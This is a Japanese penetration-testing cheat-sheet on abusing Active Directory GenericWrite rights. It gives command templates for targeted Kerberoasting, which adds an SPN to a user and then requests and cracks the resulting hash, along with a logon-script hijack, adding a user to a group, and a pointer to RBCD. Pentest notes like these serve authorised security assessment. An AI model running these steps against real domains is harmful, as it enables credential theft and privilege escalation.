# GenericWrite の悪用

## 概要

`GenericWrite` は対象オブジェクトの属性を書き込む権限。GenericAll より限定的だが、SPN の設定・logon script の変更・グループメンバーの変更など、複数の攻撃手法につながる。

---

## 着火条件

BloodHound で `[現在のユーザー or グループ] --GenericWrite--> [ターゲットオブジェクト]` が確認できた場合。

---

## 対象オブジェクト別の悪用手法

### ケース1: ユーザーオブジェクトへの GenericWrite

**手法A: Targeted Kerberoasting（SPN を付与してハッシュ取得）**

ターゲットユーザーに SPN を設定し、Kerberoasting でハッシュを取得してクラックする。実装方法は2つある。

**方法A-1: targetedKerberoast.py（自動方式 — SPN付与・取得・クリーンアップを一括）**

```bash
# [Attacker] GitHub: https://github.com/ShutdownRepo/targetedKerberoast
python3 targetedKerberoast.py -v \
  -d '[DOMAIN]' \
  -u '[CURRENT_USER]' \
  -p '[PASSWORD]' \
  --dc-ip [DC_IP]
```

このツールは：
1. GenericWrite 権限があるユーザーに自動でSPNを追加
2. TGSハッシュを取得
3. 追加したSPNを自動でクリーンアップ

**方法A-2: 手動2ステップ方式（bloodyAD + GetUserSPNs）**

自動ツールが失敗する環境、またはSPN付与とハッシュ取得を分けて確認したい場合に使う。

```bash
# Step 1: [Attacker] ターゲットユーザーに SPN を手動追加
# bloodyAD（別途インストール要: pip install bloodyAD --break-system-packages）
bloodyAD \
  -d '[DOMAIN]' --dc-ip [DC_IP] \
  -u '[CURRENT_USER]' -p '[PASSWORD]' \
  set object '[TARGET_USER]' servicePrincipalName \
  -v 'http/[任意の文字列]'

# 成功すると "[TARGET_USER]'s servicePrincipalName has been updated" が表示される

# Step 2: [Attacker] 付与した SPN でハッシュを取得
impacket-GetUserSPNs \
  -dc-ip [DC_IP] \
  -request \
  -request-user '[TARGET_USER]' \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'
```

**使い分け：**

| 状況 | 推奨 |
|------|------|
| 素早く終わらせたい（クリーンアップも自動） | 方法A-1 (targetedKerberoast.py) |
| ツールが環境に対応していない・失敗する | 方法A-2 (手動) |
| SPN が付与されたかを途中確認したい | 方法A-2 (ステップを分割できる) |
| SPN のクリーンアップを自分でコントロールしたい | 方法A-2 (`bloodyAD set object ... servicePrincipalName -v ''` で手動削除) |

> **注意：** 手動方式 (A-2) でハッシュ取得後は、付与した SPN を必ず削除すること（原状回復）。`bloodyAD ... set object '[TARGET_USER]' servicePrincipalName -v ''` で空にできる。

→ 取得したハッシュのクラック: `../Kerberos_Attacks/Kerberoasting.md`

**手法B: logon script の設定**

ターゲットがログインするたびにスクリプトが実行される：
```powershell
Set-ADUser -Identity [TARGET_USER] -ScriptPath '\\[DC]\netlogon\[script_name].bat'
```

### ケース2: グループオブジェクトへの GenericWrite

**グループメンバーの追加：**
```powershell
Add-ADGroupMember -Identity '[GROUP_NAME]' -Members '[CURRENT_USER]'
```

### ケース3: コンピューターオブジェクトへの GenericWrite

**RBCD の設定（msDS-AllowedToActOnBehalfOfOtherIdentity の変更）：**
→ 詳細: `../Delegation_Attacks/RBCD.md`

---

## GenericAll との違い

| 操作 | GenericWrite | GenericAll |
|------|-------------|-----------|
| 属性の書き込み | ✅ | ✅ |
| パスワードのリセット | ❌ | ✅ |
| オブジェクトの削除 | ❌ | ✅ |
| DACL の変更 | ❌ | ✅ |

---

## 注意点・落とし穴

- targetedKerberoast.py は SPN のクリーンアップまで自動で行うが、ツールが途中で失敗した場合は手動でクリーンアップが必要（`bloodyAD ... set object '[TARGET_USER]' servicePrincipalName -v ''`）
- logon script の手法は、ターゲットユーザーが実際にログインするまで実行されない（環境によっては長時間待機が必要）
- SPN を設定する際、ターゲットアカウントが既にSPNを持っている場合は Kerberoasting が既に可能な場合もある。`impacket-GetUserSPNs` を先に実行して確認する
- 手動方式 (A-2) で SPN を付与した場合、**ハッシュ取得後に必ず SPN を削除する**（原状回復。商用案件では必須、演習環境でも習慣化推奨）

---

## 関連技術
- SPN 付与後のハッシュ取得 → `../Kerberos_Attacks/Kerberoasting.md`
- RBCD 攻撃 → `../Delegation_Attacks/RBCD.md`
